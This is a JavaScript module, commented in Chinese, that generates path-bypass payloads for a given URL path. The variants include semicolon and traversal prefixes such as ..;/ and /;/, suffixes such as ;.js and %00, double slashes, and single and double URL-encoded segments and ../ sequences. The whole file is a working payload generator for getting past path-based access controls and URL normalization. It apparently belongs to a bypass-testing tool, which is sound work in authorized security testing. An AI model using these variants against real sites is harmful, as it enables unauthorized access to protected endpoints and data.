/* 路径绕过 / URL 编码变体生成
 * 所有变体都以 / 开头，直接拼在 BaseURL 后面。
 * 注意: fetch/URL 解析会归一化裸 ../，所以遍历类变体用 %2e%2e 或 ..; 形式。
 */
(function () {
  'use strict';

  function charHex(c, upper) {
    var h = c.charCodeAt(0).toString(16);
    return '%' + (upper ? h.toUpperCase() : h.toLowerCase());
  }

  /* 只编码字母数字，保留 - _ . ~ 等 */
  function encodeAll(seg, upper) {
    var out = '';
    for (var i = 0; i < seg.length; i++) {
      var ch = seg.charAt(i);
      out += /[A-Za-z0-9]/.test(ch) ? charHex(ch, upper) : ch;
    }
    return out;
  }

  function splitPath(p) {
    return p.split('/');
  }

  function firstCharEncode(p, upper) {
    return p.replace(/^\/([A-Za-z0-9])/, function (m, c) {
      return '/' + charHex(c, upper);
    });
  }

  function lastCharEncode(p, upper) {
    var i = p.lastIndexOf('/');
    if (i < 0 || i + 1 >= p.length) return null;
    var c = p.charAt(i + 1);
    if (!/[A-Za-z0-9]/.test(c)) return null;
    return p.slice(0, i + 1) + charHex(c, upper) + p.slice(i + 2);
  }

  function middleCharEncode(p, upper) {
    var i = p.lastIndexOf('/');
    if (i < 0) return null;
    var seg = p.slice(i + 1);
    if (!seg) return null;
    var mid = Math.floor(seg.length / 2);
    if (!/[A-Za-z0-9]/.test(seg.charAt(mid))) {
      mid = -1;
      for (var k = 0; k < seg.length; k++) {
        if (/[A-Za-z0-9]/.test(seg.charAt(k))) { mid = k; break; }
      }
      if (mid < 0) return null;
    }
    return p.slice(0, i + 1) + seg.slice(0, mid) +
      charHex(seg.charAt(mid), upper) + seg.slice(mid + 1);
  }

  function encodeFirstSegment(p, upper) {
    var parts = splitPath(p);
    if (parts.length < 2 || !parts[1]) return null;
    parts[1] = encodeAll(parts[1], upper);
    return parts.join('/');
  }

  function encodeLastSegment(p, upper) {
    var parts = splitPath(p);
    var idx = parts.length - 1;
    if (idx < 1 || !parts[idx]) return null;
    parts[idx] = encodeAll(parts[idx], upper);
    return parts.join('/');
  }

  /* slashSep 为 null 保留 /，否则用 %2f / %2F 连接 */
  function encodeWhole(p, upper, slashSep) {
    var parts = splitPath(p);
    for (var i = 1; i < parts.length; i++) parts[i] = encodeAll(parts[i], upper);
    if (slashSep) return '/' + parts.slice(1).join(slashSep);
    return parts.join('/');
  }

  function doubleEncode(s) {
    return s ? s.replace(/%/g, '%25') : s;
  }

  function genEncoding(path) {
    var out = [];
    var seen = {};

    function push(v, label) {
      if (!v || v === path || seen[v]) return;
      seen[v] = 1;
      out.push({ path: v, label: label });
    }

    /* 单字符编码 */
    push(firstCharEncode(path, false), 'URL编码：首段首字符');
    push(lastCharEncode(path, false), 'URL编码：末段首字符');
    push(middleCharEncode(path, false), 'URL编码：末段中间字符');
    push(firstCharEncode(path, true), 'URL编码：首段首字符（大写hex）');

    /* 整段编码 */
    push(encodeFirstSegment(path, false), 'URL编码：首段全编码');
    push(encodeLastSegment(path, false), 'URL编码：末段全编码');

    /* 全路径编码 */
    push(encodeWhole(path, false, null), 'URL编码：全路径（保留斜杠）');
    push(encodeWhole(path, false, '%2f'), 'URL编码：全路径（斜杠 %2f）');
    push(encodeWhole(path, false, '%2F'), 'URL编码：全路径（斜杠 %2F）');

    /* 双重编码 */
    push(doubleEncode(encodeFirstSegment(path, false)), '双重URL编码：首段');
    push(doubleEncode(encodeLastSegment(path, false)), '双重URL编码：末段');
    push(doubleEncode(encodeWhole(path, false, null)), '双重URL编码：全路径');
    push(doubleEncode(encodeWhole(path, false, '%2f')), '双重URL编码：全路径+%2f');

    /* 编码形式的 ../ 前缀 */
    push('/%2e%2e%2f' + path, 'URL编码：../ 前缀');
    push('/%252e%252e%252f' + path, '双重编码：../ 前缀');
    push('/..%2f' + path, 'URL编码：..%2f 前缀');
    push('/..%252f' + path, '双重编码：..%252f 前缀');

    return out;
  }

  function gen(path) {
    var out = [];
    var seen = {};

    function push(v, label) {
      if (!v || v === path || seen[v]) return;
      seen[v] = 1;
      out.push({ path: v, label: label });
    }

    /* 分号 / 后缀 */
    push(path + ';.js', '后缀 ;.js');
    push(path + ';', '后缀 ;');
    push(path + '/', '后缀 /');
    push(path + ';.css', '后缀 ;.css');

    /* 双斜杠 */
    push('/' + path, '前缀 //');

    /* 遍历 / 分号前缀 */
    push('/..;' + path, '前缀 ..;/');
    push('/;' + path, '前缀 /;/');
    push('/xxx/..;' + path, '前缀 xxx/..;/');
    push('/xxx/%2e%2e' + path, '前缀 xxx/%2e%2e');

    /* 其他结构变体 */
    push('/%2e' + path, '前缀 /%2e');

    var i = path.indexOf('/', 1);
    if (i > 0) push(path.slice(0, i) + '/;' + path.slice(i), '段间 ;/');

    push(path + '%3b', '后缀 %3b');
    push(path + '%00', '后缀 %00');
    push(path + '.', '后缀 .');

    /* URL 编码 / 双重编码 */
    genEncoding(path).forEach(function (v) {
      push(v.path, v.label);
    });

    return out;
  }

  window.SPB_VARIANTS = {
    gen: gen,
    genEncoding: genEncoding
  };
})();
